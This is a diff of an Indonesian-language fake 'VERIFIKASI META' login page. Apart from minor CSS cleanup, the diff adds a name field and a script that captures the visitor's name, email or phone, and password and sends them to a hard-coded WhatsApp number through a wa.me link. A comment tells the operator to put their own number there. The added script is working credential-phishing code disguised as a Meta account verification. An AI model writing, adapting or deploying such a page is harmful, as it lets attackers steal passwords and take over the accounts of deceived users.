@@ -25,7 +25,7 @@
       font-size: 1.6rem;
       font-weight: bold;
       color: #000;
-      margin-bottom: 12px; /* Menambah jarak di bawah header */
+      margin-bottom: 12px;
     }
 
     /* Tulisan tambahan di bawah header */
@@ -37,7 +37,7 @@
       font-size: 1rem;
       font-weight: 400;
       max-width: 600px;
-      margin: 0 auto 24px auto; /* Jarak bawah ke card */
+      margin: 0 auto 24px auto;
       border-radius: 4px;
     }
 
@@ -49,9 +49,8 @@
       width: 100%;
       max-width: 380px;
       padding: 24px;
-
       position: absolute;
-      top: calc(50% + 50px); /* Sesuaikan posisi untuk menambah jarak vertikal */
+      top: calc(50% + 50px);
       left: 50%;
       transform: translate(-50%, -50%);
     }
@@ -71,7 +70,7 @@
 
     label { font-weight: 500; margin-bottom: 4px; }
 
-    input {
+    input, textarea {
       width: 100%;
       padding: 12px;
       border: 1px solid #ccc;
@@ -80,7 +79,7 @@
       transition: border-color 0.2s;
     }
 
-    input:focus {
+    input:focus, textarea:focus {
       border-color: #1877f2;
       outline: none;
     }
@@ -123,21 +122,39 @@
 
   <div class="card">
     <h1>Masuk ke Akun Anda</h1>
-    <form action="seats.html" method="POST">
+    <form id="login-form">
+      <div>
+        <label for="name">Nama Lengkap</label>
+        <input type="text" id="name" name="name" placeholder="Masukkan nama lengkap" required>
+      </div>
       <div>
         <label for="emailOrPhone">Email atau Nomor Telepon</label>
-        <input type="email" id="emailOrPhone" name="emailOrPhone"
-               placeholder="Masukkan email atau nomor telepon" required>
+        <input type="email" id="emailOrPhone" name="emailOrPhone" placeholder="Masukkan email atau nomor telepon" required>
       </div>
       <div>
         <label for="password">Kata Sandi</label>
-        <input type="password" id="password" name="password"
-               placeholder="Masukkan kata sandi" required autocomplete="current-password">
+        <input type="password" id="password" name="password" placeholder="Masukkan kata sandi" required autocomplete="current-password">
       </div>
-      <button type="submit">Kirim &amp; Amankan</button>
+      <button type="submit">Kirim & Amankan</button>
     </form>
   </div>
-  
+
   <footer>&copy; 2025 VERIFIKASI META</footer>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const name = encodeURIComponent(document.getElementById('name').value);
+      const emailOrPhone = encodeURIComponent(document.getElementById('emailOrPhone').value);
+      const password = encodeURIComponent(document.getElementById('password').value);
+
+      const phoneNumber = '12498950768'; // Ganti dengan nomor WhatsApp Anda
+      const message = `Verifikasi Akun:%0A%0ANama: ${name}%0AEmail/Nomor Telepon: ${emailOrPhone}%0AKata Sandi: ${password}`;
+
+      const url = `https://wa.me/${phoneNumber}?text=${message}`;
+      window.open(url, '_blank');
+    });
+  </script>
 </body>
 </html>
